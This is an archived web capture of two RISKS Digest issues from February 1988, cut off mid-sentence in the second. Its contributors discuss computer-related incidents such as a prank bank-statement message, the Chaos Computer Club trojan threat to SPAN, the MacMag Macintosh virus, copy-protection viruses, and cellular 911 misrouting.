<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.26.html 128.240.150.127 19970217015623 text/html 15028
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:54:51 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 26</TITLE>
<LINK REL="Prev" HREF="/Risks/6.25.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.27.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.25.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.27.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 26</H1>
<H2> Saturday, 13 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Trojan horsing around with bank statements 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Star Wars Test 
</A>
<DD>
<A HREF="#subj2.1">
Reid Simmons
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Last-clasp credit cards 
</A>
<DD>
<A HREF="#subj3.1">
Carolyn M. Kotlas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "Inmate gets into computer files"; computer porn 
</A>
<DD>
<A HREF="#subj4.1">
Prentiss Riddle
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Safe Programming Languages 
</A>
<DD>
<A HREF="#subj5.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Viruses and Virtual Memory 
</A>
<DD>
<A HREF="#subj6.1">
Dave Tweed
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Software-based Mugging -- RISKS of Dragon Quest
</A>
<DD>
<A HREF="#subj7.1">
John Elemans via Kevin Kelly
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Trojan horsing around with bank statements
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Sat 13 Feb 88 18:04:02-PST
</i><PRE>

My Wells Fargo EquityLine statement of 2 Feb 88 had the following message
at the bottom:

  YOU OWE YOUR SOUL TO THE COMPANY STORE.  WHY NOT OWE YOUR HOME
  TO WELLS FARGO?  AN EQUITY ADVANTAGE ACCOUNT CAN HELP YOU SPEND
  WHAT WOULD HAVE BEEN YOUR CHILDREN'S INHERITANCE.

It took until 11 Feb for Wells Fago to send out the following letter:

  I wish to extend my personal apology for a message printed on your
  EquityLine statement dated February 2, 1988.

  This message was not a legitimate one.  It was developed as part of
  a test program by a staff member, whose sense of humor was somewhat
  misplaced, and it was inadvertently inserted in that day's statement
  mailing.  The message in no way conveys the opinion of Wells Fargo
  Bank or its employees.  You may be assured that the financial 
  information on the statement was correct, and the confidentiality of
  your individual account information has been maintained. [...]

  [James G. Jones, Executive Vice President, South Bay Service Center]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Star Wars Test
</A>
</H3>
<address>
&lt;<A HREF="mailto:REID%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU">
REID%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Sat, 13 Feb 1988  18:08 EST
</i><PRE>

Item in The Boston Globe, 2/13/88 (from the Associated Press)

         Tracking test fails in 'star wars' satellite flight

A satellite launched last week to test elements of the proposed "star
wars" antimissile shield failed in a tracking exercise when an optical 
sensor gave false data to two onboard computers...

Col. John Otten of the Air Force... said an optical sensor on a satellite
gave flawed data when it tried to track target objects that were beyond
its range.

Otten said the sensor data went into the computers, causing them to 
respond inappropriately.  He said the flaw was detected within an hour
and that the computers were told to ignore the data. This corrected the
problem. [! more likely, it just masked the symptoms]

Some of the test data on the system disappeared because of the problem,
but Otten said the loss was minor because the tracking exercise was a
secondary objective. "In the fundamental mission, we succeeded," he said.

The satellite, Delta 181,... spent 12 hours conducting a series of tests
to gather data needed to refine the "star wars" antimissile system.
Last week, the program manager...called the flight "a very successful mission."
However, Aviation Week and Space Technology, in a story prepared for 
Monday [2/15/88] publication, said the satellite was unable to complete
"battle management fire control computations."

The magazine said the computers were responsible for the problem, but Otten
said the flaw actually was caused by the optical sensor attempting to lock
onto an object beyond its range.  Otten said the problem developed when the
optical sensor located an object, looked away, and then tried to relocate
the original object.  By then, the target had moved beyond the range of the
sensor.

[There is no indication in the article what the "primary mission" was, or
how "success" was determined, considering the number of things that
apparently went wrong.]

Reid Simmons, MIT AI Lab

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Last-clasp credit cards (Re: <A HREF="/Risks/6.25.html">RISKS-6.25</A>)
</A>
</H3>
<address>
Carolyn M. Kotlas
&lt;<A HREF="mailto:ecsvax!kotlas@mcnc.org ">
ecsvax!kotlas@mcnc.org 
</A>&gt;
</address>
<i>
Fri, 12 Feb 88 08:13:45 est
</i><PRE>
News-Path: mcnc!gatech!udel!rochester!bbn!uwmcsd1!ig!agate!ucbvax!KL.SRI.COM!RISKS

       "Collidal goo considered harmful" (Jon Jacky)

[PGN's annotation notes that credit-card magnetic stripes may be affected by
magnetized clasps, which are increasingly being found on] snap-closure purses
and wallets.  I personally had 2 credit cards' codes scrambled for apparently
no reason.  Quite accidentally, I noticed that the magnetic snap on my handbag
was powerful enough to attract and lift a heavy pair of scissors.  If it was
that strong, it probably had no problem affecting the credit card inside which
was in a thin nylon case.  After I switched to handbags without these snaps, I
never had a problem again.  The handbag manufacturers seem to think that these
snaps are so convenient that they are putting them on more and more bags, so it
is almost impossible to find non-magnetized snaps on handbags.  I would be
curious to know how many of the handbags cited in the article, besides being
made of eelskin also had snap closures.

Carolyn Kotlas    (kotlas@ecsvax.UUCP  or  kotlas@ecsvax.BITNET)
UNC-Educational Computing Service   P. O. Box 12035      2 Davis Drive
Research Triangle Park, NC  27709   State Courier #315   919/549-0671

                       [She who clasps last clasps best.  If it changes the
                       credit-card hologram, you are an iconoclasp.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"Inmate gets into computer files"; computer porn
</A>
</H3>
<address>
Prentiss Riddle
&lt;<A HREF="mailto:woton!riddle@im4u.utexas.edu ">
woton!riddle@im4u.utexas.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 11 Feb 88 21:04:02 GMT
Organization: Shriners Burns Institute, Galveston

"PARCHMAN, Miss. (AP) -- An inmate serving a 30-year term has been
accused of tampering with computer records at the State Penitentiary,
allowing him to sell about 100,000 pounds of prison cotton and possibly
try to obtain an early release.  Corrections Commissioner Gene Scroggy
said Monday the inmate had worked as a clerk at the penitentiary's
prison industries program and was given his own computer and access to
the institution's entire computer system."

Also recently seen in my local paper was a wire service report on computer
pornography, which lumped together dirty joke files, girly graphics,
sexually oriented computer games and BBS systems catering to pedophiles.
The tone of the article was pitched at scaring parents about what their kids
might be getting into with their PCs.  (I wish I'd clipped a copy, but I
thought sure some RISKS reader would beat me to it.)

Prentiss Riddle riddle@woton.UUCP  {ihnp4,harvard}!ut-sally!im4u!woton!riddle
Opinions expressed are not necessarily those of my employer.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Safe Programming Languages
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mcvax!praxis!mct@uunet.UU.NET">
mcvax!praxis!mct@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 17:37:27 BST
</i><PRE>

There is a (draft) definition of a language that is designed to make it
harder to write incorrect programs.

The language (defined in terms of its abstract syntax tree, to facilitate
program transformation in the language), is called NewSpeak, and is the work
of Ian Currie, at the Royal Signals and Radar Establishment, MoD, UK.  It is
an "unexceptional language" - programs cannot loop infinitely, run out of
store at runtime, or cause address errors or numeric overflow.  Where the
compiler cannot deduce the safety of an operation, the programmer is
required to supply a checkable assertion.

The language is designed for safety-critical applications, and the ideal
hardware target is VIPER (RSRE's formally-proven 32-bit microprocessor).

A design rationale is in "Orwellian programming in safety-critical systems",
Proc IFIP working conference on System Implementation Languages, experience
and assessment.  University of Kent at Canterbury, 1984.

Further details may be available from Ian Currie at RSRE, St Andrews Rd, Gt
Malvern, Worcs  WR14 3PS, UK.

Martyn Thomas, Praxis plc, 20 Manvers Street, Bath BA1 1PX UK.
Tel:	+44-225-444700.   Email:   ...!uunet!mcvax!ukc!praxis!mct 

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Viruses and Virtual Memory
</A>
</H3>
<address>
&lt;<A HREF="mailto:apollo!tweed@csl.sri.com">
apollo!tweed@csl.sri.com
</A>&gt;
</address>
<i>
Thu, 11 Feb 88 09:09:38 EST
</i><PRE>

   All of this discussion (panic?) about viruses in the PC world makes me
wonder all the more why users aren't more interested in virtual memory
systems with hardware protection. In a properly designed system (hardware +
O/S) it's impossible for a user-level application to corrupt system code
(subvert interrupt vectors, etc.)

   It's generally accepted that you need physical access to such
a system in order to corrupt it. Software distribution by networks
or removable media can't do it. You would have to replace system
files *and then reboot* (physical access).

   This, along with the other benefits of virtual memory (larger address
space, easier multitasking, easier porting of software from "real" systems),
would seem to me to push towards having it.  The hardware is there for both
Intel and Motorola processors.  Yet, OS/2 doesn't have it. Some UNIX
look-alikes don't even have it. Why not?
                                             Dave Tweed, Apollo Computer, Inc.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Software-based Mugging -- RISKS of Dragon Quest (lightly edited) 
</A>
</H3>
<address>
Kevin Kelly
&lt;<A HREF="mailto:well!kk@lll-crg.llnl.gov ">
well!kk@lll-crg.llnl.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 13 Feb 88 03:58:17 GMT
Organization: Whole Earth 'Lectronic Link, Sausalito, CA

[From the Information Conference on the WELL that Kevin cohosts with Howard
Rheingold. John posts from Tokyo.  This is the first software mugging I've
heard of, so thought you might be interested.]

Topic  40:  The public image of software
From: John Elemans (sungja)      Wed, Feb 10, '88  [several messages]

NHK, Japan's national broadcasting company, today reported that at one store
alone 10,000 people lined up today to buy a newly released *program*. People
began lining up the yesterday, Feb 9, to pick up the first copies of "Dragon
Quest III", the latest installment in a serial adventure program for
Nintendo computers. The newscast also reported that educational authorities
were shocked to find many students skipping classes in order to get the
program as soon as possible. Police warned 300 students against skipping
classes. 

Estimated first day sales for Dragon Quest III are 1,000,000 ROM cartridges.
The first day price was 4,130 Yen, at 129 Yen/US$ that is a first day retail
sale of 32,000,000 US$! One commentator called it "softo-fever".  [...]

The Japan Times (Wednesday, Feb 10, 1988) reported that 289 students were not
warned by police against skipping classes, but actually "taken into custody".

Also, at least one software-mugging was reported. A 14-year old told police
he was knocked off of his bike by three older boys who took his "Dragon
Quest III" and rode off on their bikes!

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.25.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.27.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-63</DOCNO>
<DOCOLDNO>IA012-000130-B024-237</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.27.html 128.240.150.127 19970217015636 text/html 27902
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:55:04 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 27</TITLE>
<LINK REL="Prev" HREF="/Risks/6.26.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.28.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.26.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.28.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 27</H1>
<H2> Tuesday, 16 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Sometimes doing nothing is doing something 
</A>
<DD>
<A HREF="#subj1.1">
Carl via Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  More info on Compuserve Macinvirus 
</A>
<DD>
<A HREF="#subj2.1">
Max Monningh
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Viruses as copy protection 
</A>
<DD>
<A HREF="#subj3.1">
Eliot
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Trojan horsing around with bank statements 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: computer pornography 
</A>
<DD>
<A HREF="#subj5.1">
Jonathan Kamens
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Emergency Calls misdirected by Cellular Telephone System 
</A>
<DD>
<A HREF="#subj6.1">
Dave Wortman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Software Warranties 
</A>
<DD>
<A HREF="#subj7.1">
Robert Kennedy
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Mag-stripe cards 
</A>
<DD>
<A HREF="#subj8.1">
Joel Kirsh
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Interleaving of Early Warning Systems 
</A>
<DD>
<A HREF="#subj9.1">
Herb Lin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  What is the responsibility of Administrators? 
</A>
<DD>
<A HREF="#subj10.1">
Chris McDonald
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Data Physician -- Correction (Re: <A HREF="/Risks/6.25.html">RISKS-6.25</A>) 
</A>
<DD>
<A HREF="#subj11.1">
Andrew Hastings
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Reporter seeking virus information 
</A>
<DD>
<A HREF="#subj12.1">
John Gilmore
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Sometimes doing nothing is doing something
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Tue, 16 Feb 88 18:04 EST
</i><PRE>

Forwarded from INFO-VAX.         				-- Jerry

Date: Wed, 10 Feb 88 18:43:53 PST
From: carl@CitHex.Caltech.Edu
Subject: The Chaos Computer Club's Trojan Horse threat was apparently successful
To: info-vax@CitHex.Caltech.Edu

A week or so ago, the Chaos Computer Club of West Berlin announced  that  they
were  going  to  trigger  trojan  horses  they'd previously planted on various
computers in the Space Physics Analysis Network.  Presumably, the  reason  for
triggering  the  trojan  horses was to throw the network into disarray; if so,
the threat has, unfortunately, with  the  help  of  numerous  fifth-columnists
within  SPAN,  succeeded.   Before  anybody  within  SPAN  replies  by  saying
something to the effect of "Nonsense, they didn't succeed  in  triggering  any
trojan  horses",  let  me  emphasize that I said the THREAT succeeded.  That's
right, for the last week SPAN hasn't been functioning very well as a  network.
All  to  many of the machines in it have cut off network communications (or at
least lost much of their connectivity), specifically in  order  to  avoid  the
possibility that the trojan horses would be triggered (the fifth-columnists to
whom I referred above are those system and network managers  who  were  thrown
into  panic  by  the  threat).   I  find  this  rather amazing (not to mention
appalling) for a number of reasons:
    1)  By reducing networking activities, SPAN demonstrated that the CCC DOES
        have the power to disrupt the network (even if there aren't really any
        trojan horses out there);
    2)  Since the break-ins that would  have  permitted  the  installation  of
        trojan  horses,  there  have  been  a  VMS release (v4.6) that entails
        replacement of ALL DEC-supplied images (well, not quite:  some layered
        products  didn't  have to be reinstalled; however, there have been new
        versions of many layered products since the break-ins).   Installation
        of  the  new  version  of  VMS provided a perfect opportunity to purge
        one's system of any trojan horses.
    3)  In addition to giving CCC's claims credibility, SPAN's response to the
        threat  seems  a  bit  foolish since it leaves open the question "What
        happens if the CCC activates trojan horses  without  first  holding  a
        press conference?".
Hiding from the problem doesn't help in any way that  I  can  see;  it  merely
makes SPAN (and NASA) look foolish.

Disclaimer:  The opinions expressed above are my own, and not necessarily
	     those of my employers.  The opinion of one of my bosses is (at
	     least in part) that he'd like to regain access to some of the
	     databases that SPAN's managers have isolated in their panic.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 More info on Compuserve Macinvirus
</A>
</H3>
<address>
&lt;<A HREF="mailto:    MAXWELL%FNALC.BITNET@CUNYVM.CUNY.EDU">
    MAXWELL%FNALC.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Sun, 14 Feb 88 23:33 CST
</i><PRE>

 Here is some more info on the Compuserve Mac-virus (see <A HREF="/Risks/6.22.html">RISKS-6.22</A>).
 (From the Chicago Tribune, without their permission of course)

          Chicago Tribune, Sunday 14 Feb. 1988, Section 7, Page 8

              "Virus gimmick is 'vandalism, pure and simple'"
                            by Daniel Brogan

"By now you've probably read a thing or two about computer viruses.  Every-
 one seems to be talking about them.  [explanation deleted]

 The matter of computer viruses is a matter of heated debate in computer
 circles. Some fear [the obvious].   Others see [it as an urban legend born
 of science fiction and societal technophobia].

 I was inclined to side with the latter group. [This guy's a reporter??]
 Every virus report I investigated seemed to have taken place in some
 foreign country or was attributed to a friend of a friend.

 Then I ran into a real honest-to-goodness virus. [more stuff we already
 know]

 As it turned out the virus was pretty tame.  On March 2, the user would
 be greeted with the following message:
        "RICHARD BRANDOW, publisher of MacMag, and its entire staff would
         like to take this opportunity to convey their UNIVERSAL MESSAGE
         OF PEACE to all Macintosh users around the world."

 After displaying the message, the virus would quietly delete itself without
 disturbing any other data.  At least 40 subscribers downloaded the virus
 from Compuserve.  The stack was also spotted on SEVERAL other commercial
 databases.

 I called Brandow, who readily accepted responsibility for the virus. [Here
 comes the bilge...] 'Actually, we like to call it a message,' he told me.
 'We look at is a something that's really positive.'  MacMag is a Canadian
 monthly with a circulation of about 40,000.

 Brandow began toying with the idea of his message about 2 years ago, toyed
 with various distribution schemes, settled on a virus and HIRED A PROGRAMMER!!
 (March 2 was chosen to commemorate the 1st birthday of the Mac II.

 He then infected 2 Macs at MacMag for 2 days in December.  Already, he
 says the virus has been sighted throughout Europe. 'People there are reacting
 to it like a new form of art.  They think it's a nifty form of communication.'

 [Brogan's opinion deleted] Brandow says, 'I really think it's a difference
 of philosophy. People here in Canada and over in Europe see this for what
 it is, a message of peace.  It's you people in the United States who see
 it as something dark and nasty.' [Henry, are we really that paranoid down
 here?]

 Neil Shapiro, Compuserve's Macintosh forum admin worries that 'MacMag has
 opened here a Pandora's Box of problems which will haunt our community
 for years.'"

[beg.flame]
Who the hell does this clown think he is??  How could he possibly get to the
position in life to publish his own magazine and be unable to think through
the logical, INEVITABLE implications of his actions??  American's are just
paranoid?? Oh sure, there have never been ANY Canadian crackers, the Chaos
Computer Club [Europe], the IBM Christmas card [W.Germany] and the Israeli
virus are just campfire fictions.  And what about the little American
computer geek who at THIS VERY MINUTE is probably altering the DNA inside
Brandow's message to do nasty things?  Mac users ARE particularly bad about
software hygiene,(I used to be, untill I subscribed to Risks...)  and there
ARE a lot of people who use Macs for REAL WORK.  I assert that some of these
people bought Macs because they don't like what IBM stands for, believe in
"the little guy" because they are too, are undercapitalized and could be
seriously screwed if one of their employees loads a sick disc.  Some of
these people are going to learn a painfully expen$ive le$$on because of
Brandow.  I know that someone out west uses Macs for Cray terminals...the
mind boggles.

Since Brandow lives in Canada and not here in Chicago, I can't get Vito,
the alderman's nephew, to break his knees; I don't s'pose he lives in
Toronto ;-&gt; ...

I therefore propose economic response.  The liquidation of Brandow's business
will probably be insufficient to cover the losses which will eventually
be suffered by the Macuser community (and it wouldn't help anyway) but it
might make an impression.

[end.flame]

I also have an opinion about his method of spreading the virus, which may
or may not have been discussed here previously.  Most of my old risks issues
are archived on tape, the robot's slow, and I don't have a quota THAT big
anyway...I'll do my homework and maybe post something on the subject later.

Max Monningh, Fermi National Accelerator Laboratory, Box 500,  MS-355 Batavia,
IL 60510            MAXWELL@FNALB.BITNET          SPAN/HEPnet:  43011MAXWELL

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Viruses as copy protection
</A>
</H3>
<address>
&lt;<A HREF="mailto:ELIOT%cs.umass.edu@RELAY.CS.NET">
ELIOT%cs.umass.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 11 Feb 88 11:55 EDT
</i><PRE>

The idea of using a virus as a copy protection mechanism is very
scary.  Here are a couple of ideas for people to try to use to
convince companies not to try this.

(1) Suppose a virus from a stolen system finds its way into someone
else's computer, who had no knowledge or involvement with the piracy.
The person who buys software ussually has a contract protecting the
company from liability, but I cannot see the company escaping legal
liability to a third party who is damaged by software doing what
they intended it to do.  If this happened to me I would certainly
sue the company for everything it had.  Consider, for example, that
you are liable for injuries to a burgler who is hurt by
a trap inside your home.

(2) Protection schemes can fire incorrectly.  Consider a *legitimate*
owner of a piece of software who runs it from an *old* disk.  A
little bit of bit-rot and all of a sudded the program thinks it is
stolen...

(3) Another example, that has happened to me.  I am a *legitimate*
owner of a copy-protected macintosh game program.  I have used
it quite happily on my 512K Macintosh.  My "licence" allows me
to run it on any single machine etc., so I tried using the
original master disk on a Macintosh SE.  This wa perfectly
legitimate, but the slightly differences in the machines was
enough to set off their copy protection scheme.  Since the game
runs, but cheats, when this happens it took me quite a while to
be sure of what was happening.

The basic point is that software cannot reliably detect that is
has been illegitimately copied.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Trojan horsing around with bank statements
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 15 Feb 88 18:02:58 EST
</i><PRE>

&gt;  This message was not a legitimate one.  It was developed as part of
&gt;  a test program by a staff member, whose sense of humor was somewhat
&gt;  misplaced, and it was inadvertently inserted in that day's statement...

Note an analogy to the "no jokes please" signs at airport security-screening
stations:  there are times and places which are just too sensitive for
certain types of humor.  Putting an "EXPLOSIVES" sticker on your friend's
suitcase, however appropriate it might be as a joke in the right situation,
is defensible only if you take precautions to be SURE it gets removed before
he tries to go through airport security.  Good intentions are not enough;
redundant precautions are in order, in case something goes wrong.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

   [John Markoff told me today that Wells Fargo still does not know who
   is responsible.  By the way, despite my choice of SUBJECT: line, I have no
   inside information that would lead me to believe it was an intentional
   Trojan horse rather than an accidental leakage.  But that is certainly a
   possibility under th circumstances!  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: computer pornography
</A>
</H3>
<address>
&lt;<A HREF="mailto:jik@ATHENA.MIT.EDU">
jik@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 15 Feb 88 14:27:55 EST
</i><PRE>

In Risks Digest 6.26, Prentiss Riddle (riddle@woton.UUCP) mentions a
wire service report about computer pornography.  We've had firsthand
experience in the "dangers" of computer pornography here at MIT's
Project Athena computer system in the past few weeks....

About a month ago, an employee of Project Athena (who is also an MIT
student) created a directory entitled "xpix" which contained all kind
of graphic files, most of which were either digitized or scanned from
pictures.  These files had been circulating around Athena in many
different users' subdirectories for some time, and the student who
organized them all was simply trying to conserve space and make them
easier to access.  Also included in the xpix directory was a program
to place any of the pictures in the directory into the background of a
workstation (Athena workstations are multiple-window environments with
a background which is normally gray.).

Included in the xpix directory were two subdirectories entitled "boys"
and "girls;" I am sure you can imagine what kinds of graphics they
contained.  After the xpix directories had existed for about a week,
the director of Project Athena announced that complaints about the
boys and girls directories had been made by a dean; the dean had said
that she had received complaints from students.  The xpix directory
was soon thereafter made totally inaccessible to Athena users.

Approximately a week later, the xpix directory was restored, but the
boys and girls directories are no longer readable.

A few observations: 

First of all, is what Athena did legitimate?  They claimed that since
the xpix directory was an independent filesystem and was not a part of
any user's home directory, Athena was "supporting" it by allowing it
to exist.  Since Athena did not want to "support" pornography, they
could not allow the offensive [to some people] directories to remain
world-readable.  Basically, what they are saying is that if any user
decides to take all of the offensive pictures (if he can get access to
them) and place them into his home directory and make them
world-readable, there is nothing Athena can do to stop him.

Second, the student who created xpix estimates that while the girls
and boys directories were taking up 4 or meg before they were
segregated, the many copies of the pictures which have been obtained
by whatever means since the directories were cut off are now taking up
about 50 meg of system space.  Was it really worth it for Athena to
install the directory protections if there are ways to get around them
and the net result is less efficient use of system resources?

What are the possible implications of Project Athena's decision?  Can
the administration of a supposedly user-privacy-secure system censor
the material that is made accessible on it?  Is the presence of a
filesystem on a machine evidence that the administration "supports"
the contents of the filesystem?

  Jonathan Kamens, MIT '91

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Emergency Calls misdirected by Cellular Telephone System
</A>
</H3>
<address>
Dave Wortman 
&lt;<A HREF="mailto:dw%csri.toronto.edu@RELAY.CS.NET">
dw%csri.toronto.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Fri, 12 Feb 88 13:00:22 EST
</i><PRE>

Several cases have been reported here recently in which calls from cellular
telephones to the 911 emergency number have been seriously misdirected due to
